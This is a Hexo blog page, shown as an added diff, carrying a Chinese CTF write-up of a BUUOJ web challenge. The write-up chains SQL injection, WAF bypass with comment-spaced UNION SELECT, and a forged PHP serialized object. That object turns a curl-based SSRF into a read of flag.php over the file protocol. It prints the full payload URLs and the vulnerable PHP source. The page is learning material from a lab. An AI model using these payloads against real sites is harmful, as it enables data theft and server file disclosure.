@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43818995&#x2F;article&#x2F;details&#x2F;104529233https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45425482&#x2F;article&#x2F;details&#x2F;103868660h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20200421学习笔记">
+<meta property="og:url" content="https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43818995&#x2F;article&#x2F;details&#x2F;104529233https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45425482&#x2F;article&#x2F;details&#x2F;103868660h">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/04211.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/04212.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/04213.jpg">
+<meta property="article:published_time" content="2020-04-21T14:32:41.000Z">
+<meta property="article:modified_time" content="2020-04-21T16:14:27.758Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="mysql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/04211.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>20200421学习笔记</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/04/20/c-memset/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=20200421学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=20200421学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=20200421学习笔记&body=Check out this article: https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=20200421学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=20200421学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=20200421学习笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8A%E5%A4%A9%E5%81%9Abuuoj%E5%81%9A%E4%BA%86%E4%B8%80%E9%81%93web%E9%A2%98%EF%BC%8C%E6%80%BB%E7%9A%84%E6%9D%A5%E8%AF%B4%E8%80%83%E5%AF%9F%E5%88%B0%E4%BA%86SQL%E6%B3%A8%E5%85%A5%E3%80%81SSRF%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E3%80%82%E8%BF%99%E4%B8%89%E4%B8%AA%E8%80%83%E7%82%B9%E6%88%91%E9%83%BD%E6%83%B3%E5%88%B0%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%80%E5%9D%97%E8%80%83%E6%88%91%E6%98%AF%E6%B2%A1%E6%83%B3%E5%88%B0%E7%9A%84%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E9%93%BA%E5%9E%AB"><span class="toc-number">1.1.</span> <span class="toc-text">知识铺垫</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-UNION-SELECT-%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">MYSQL UNION SELECT ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-CONCAT-GROUP-CONCAT"><span class="toc-number">1.1.2.</span> <span class="toc-text">MYSQL CONCAT GROUP_CONCAT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">1.1.3.</span> <span class="toc-text">SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E4%B8%8A%E5%B8%9D%E8%A7%86%E8%A7%92%E5%86%8D%E7%9C%8B%E8%BF%99%E9%81%93%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">在上帝视角再看这道题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        20200421学习笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-21T14:32:41.000Z" itemprop="datePublished">2020-04-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/mysql/" rel="tag">mysql</a>, <a class="tag-link-link" href="/tags/php/" rel="tag">php</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。"><a href="#今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。" class="headerlink" title="今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。"></a>今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。</h1><p>参考链接：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43818995/article/details/104529233">https://blog.csdn.net/weixin_43818995/article/details/104529233</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45425482/article/details/103868660">https://blog.csdn.net/weixin_45425482/article/details/103868660</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.html">https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.html</a><br><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_union.asp">https://www.w3school.com.cn/sql/sql_union.asp</a></p>
+<h2 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h2><h3 id="MYSQL-UNION-SELECT-："><a href="#MYSQL-UNION-SELECT-：" class="headerlink" title="MYSQL UNION SELECT ："></a>MYSQL UNION SELECT ：</h3><p>比如<br>select username,password from user union select 1,2<br>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。<br>可以先根据orderby判断字段个数，判断完字段个数后根据union select 1，2，3…判断在哪儿显示。<br>对union UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名  这句话的举例：</p>
+<img src="http://cdn.polowong.top/static/images/04211.jpg">
+<h3 id="MYSQL-CONCAT-GROUP-CONCAT"><a href="#MYSQL-CONCAT-GROUP-CONCAT" class="headerlink" title="MYSQL CONCAT GROUP_CONCAT"></a>MYSQL CONCAT GROUP_CONCAT</h3><p>concat(str1,’separator’,str2) // separator是分隔符<br>可以在结果中连接多个字段 比如下图举例 连接username,password为一个字段。</p>
+<img src="http://cdn.polowong.top/static/images/04212.jpg">
+<p>group_concat()GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。<br>简单的来说就是把查询到的数据丢到一行显示，在注入的时候就不用一个个limit了。<br>比如查表名：select group_concat(table_name) from information_schema.tables where table_Schema=数据库名 一条可以查到该数据库所有的表名</p>
+<img src="http://cdn.polowong.top/static/images/04213.jpg">
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>php的curl未经严格过滤可能导致SSRF（利用file协议。）</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>进去之后注册，注册完不知道有啥用了，打开扫描器扫一下，扫到了robots.txt<br>robots.txt提示了有个user.php的备份，下载下来。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对该文件分析可以发现存在SSRF利用点，其他的暂时没想起来。然后看一下/view.php<br>注意url，穿了个参数。。maybe注入？<br>给个-1试试：报错。把绝对路径爆出来了：/var/www/html/view.php<br>再查查试试：-1 union select 1,2,3 给waf了 过滤了啥不知道 挨个试试，应该是过滤了 union select,把空格换成注释绕过。union/<strong>/select成功绕过。<br>接下来就是判断列数，查数据库名，查表名，查字段。。<br><a target="_blank" rel="noopener" href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/</a></strong>/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27 这是查字段<br>然后查data字段 <a target="_blank" rel="noopener" href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users</a><br>发现数据是O:8:”UserInfo”:3:{s:4:”name”;s:6:”123123”;s:3:”age”;i:123123;s:4:”blog”;s:13:”<a target="_blank" rel="noopener" href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a><br>眼熟不？序列化后的数据？是不是该想想反序列化的问题了？<br>然后读备份的代码，我们应该利用getBlogContents（）方法进行SSRF,内容为file://var/www/html/flag.php，那么注册的时候能填这个不？当然过滤了。<br>所以，我们猜测，完整的流程应该是这样：<br>用户注册http开头的blog，把对象序列化后存入数据库，当用户查询的时候，查询到序列化数据反序列化，然后交给getBlogContents（）方法去用curl发送请求。<br>我们要做的就是让数据库查到的请求返回的是我们恶意构造的序列化对象，该对象的blog为file:///var/www/html/flag.php。<br>就是要把 O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;} 这一串当作查询返回的结果，应该怎么办呢？UNION SELECT！<br>注意与列对应（根据我们刚才查的列，知道data是第四个字段，所以把payload放到第四个字段上对应~）<br>payload:<a target="_blank" rel="noopener" href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:%7Bs:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;%7D%27">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27</a><br>然后查看源码中的iframe，解密base64得到flag。</p>
+<h2 id="在上帝视角再看这道题"><a href="#在上帝视角再看这道题" class="headerlink" title="在上帝视角再看这道题"></a>在上帝视角再看这道题</h2><p>为了证明我的思路是正确的，我利用SSRF漏洞获取到了db.php,user.php,show,php,join.ok.php<br>下面是view.php的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;error.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> DB();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ko&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;User&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;bootstrap.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;anti_sqli(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;table class=&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                username</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                age</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                blog</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$user</span>-&gt;age; <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> xss(<span class="variable">$user</span>-&gt;blog); <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$user</span>-&gt;getBlogContents();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="number">404</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = base64_encode(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>其中，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);<span class="comment">//这句话也解释了为什么要对应第四个字段。</span></span><br></pre></td></tr></table></figure>
+<p>这两句话印证了我的思路：反序列化数据库中的data字段—存放的user，反序列化后调用getBlogContents()，在getBlogContents()中调用get(user-&gt;blog)，在这里面CURL请求，然后在前端输出base64加密的值。</p>
